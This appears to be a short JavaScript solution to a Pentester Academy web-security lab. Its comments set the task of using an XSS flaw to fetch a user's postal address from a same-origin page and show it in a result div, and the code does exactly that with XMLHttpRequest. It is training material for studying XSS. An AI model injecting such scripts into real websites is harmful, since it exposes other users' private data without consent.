// https://pentesteracademylab.appspot.com/lab/webapp/jfp/18

// Objectives:
//     Find John's Postal Address using an XSS vulnerability on this page
//     Display the Postal address in the div with id "result"
//     No Hardcoded values can be used - everything has to be figured out dynamically


let http = new XMLHttpRequest();
const url = '/lab/webapp/jfp/18/address';
http.open('GET', url);

// If specified, responseType must be empty string or "document"
http.responseType = 'document';
http.send()

http.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        let address = http.responseXML.getElementById("address").innerHTML;
        let h4 = document.createElement('h4');
        h4.textContent = address;
        let div = document.getElementById('result');
        div.appendChild(h4);
    }
}